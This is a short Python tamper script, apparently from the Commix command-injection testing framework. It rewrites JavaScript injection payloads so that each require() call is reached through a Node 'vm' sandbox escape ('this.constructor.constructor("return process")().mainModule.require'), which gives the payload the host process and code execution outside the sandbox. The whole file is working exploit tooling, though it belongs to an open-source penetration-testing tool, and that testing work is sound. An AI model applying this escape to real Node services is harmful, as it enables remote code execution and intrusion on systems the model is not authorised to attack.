#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks

"""
About: Reaches the payload's own require() through the constructor chain, for a sink evaluating inside a Node 'vm' sandbox rather than a plain eval().
Notes: This tamper script works against target(s) evaluating JavaScript (i.e. option '--eval=javascript').
       A 'vm' context built from a plain object still inherits 'constructor' from the host
       realm's own Object.prototype, and Function's own constructor compiles new code outside the
       sandbox entirely - 'this.constructor.constructor("return process")()' hands back the real
       process object, with require reachable from there. Node's own documentation says as much:
       the module separates which variables a context starts with, not what the language can still
       do with them.
Reference: https://ctftime.org/writeup/39027
"""

__tamper__ = "jsvmescape"
__priority__ = settings.PRIORITY.NORMAL

def dependencies():
  return checks.tamper_dep_command_incompatible(__tamper__) or checks.tamper_dep_grammar_only(__tamper__, "javascript")

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# Compiled by the sandbox's own Function constructor, but outside the sandbox the moment it runs.
_ESCAPE = 'this.constructor.constructor("return process")().mainModule.'

def tamper(payload):
  if settings.EVAL_GRAMMAR.NAME != "javascript":
    return payload
  # Every require() the grammar writes is the same bare module lookup a plain eval() would resolve
  # on its own - inside a vm context there is no such global, so each one is reached through the
  # escape instead, in place rather than through some second payload of its own.
  return payload.replace('require(', _ESCAPE + 'require(')

# eof
